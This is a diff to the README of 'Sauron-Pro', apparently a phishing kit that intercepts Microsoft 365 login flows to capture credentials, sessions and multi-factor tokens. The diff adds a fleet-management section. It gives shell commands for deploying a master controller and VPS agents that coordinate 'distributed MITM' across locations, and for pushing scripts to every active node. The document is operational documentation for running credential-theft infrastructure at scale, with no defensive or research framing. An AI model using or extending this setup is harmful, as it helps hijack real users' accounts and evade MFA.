@@ -10,6 +10,7 @@ Microsoft 365 login flow interception for credential capture and session harvest
 - **2FA Bypass**: Multi-factor authentication token harvesting
 - **Live Monitoring**: WebSocket dashboard for real-time operations
 - **SSL Automation**: Automatic HTTPS certificates
+- **Fleet Management**: Deploy and control multiple VPS instances from central master controller
 
 ## 🚀 Installation
 
@@ -110,7 +111,59 @@ sudo ./update-sauron.sh --force
 sudo ./update-sauron.sh --check
 ```
 
-## 📱 Usage
+## � Fleet Management System
+
+**NEW**: Deploy and control multiple Sauron-Pro instances across different VPS servers from a centralized master controller.
+
+### 🏛️ Architecture
+
+- **Master Controller**: Single server that manages the entire VPS fleet
+- **VPS Agents**: Individual Sauron instances that register with the master
+- **Distributed MITM**: Coordinate operations across multiple geographic locations
+- **Centralized Control**: Manage all VPS instances from one admin interface
+
+### 📋 Quick Deployment
+
+**Deploy Master Controller:**
+
+```bash
+# Set your master domain
+export DOMAIN=master.example.com
+sudo ./scripts/deploy-fleet-master.sh
+```
+
+**Deploy VPS Agents (on each VPS):**
+
+```bash
+# Point to your master controller
+export MASTER_URL=https://master.example.com:8443
+export VPS_ID=vps-001
+sudo ./scripts/deploy-vps-agent.sh
+```
+
+### 🎮 Fleet Management
+
+```bash
+# View all VPS instances
+/opt/sauron-pro/bin/fleet-status
+
+# Send commands to specific VPS
+/opt/sauron-pro/bin/fleet-command vps-001 status
+/opt/sauron-pro/bin/fleet-command vps-001 restart
+/opt/sauron-pro/bin/fleet-command vps-001 script '{"script": "update.sh"}'
+
+# Execute on all active VPS
+for vps in $(curl -s https://master.example.com:8443/fleet/instances | jq -r '.instances[] | select(.status=="active") | .id'); do
+  /opt/sauron-pro/bin/fleet-command $vps script '{"script": "cleanup.sh"}'
+done
+```
+
+### 📖 Complete Documentation
+
+- **[Fleet Management Guide](docs/FLEET_MANAGEMENT.md)** - Complete setup and usage
+- **[Fleet Management Dashboard](docs/fleet-management.html)** - Interactive web documentation
+
+## �📱 Usage
 
 ### Access Points
 
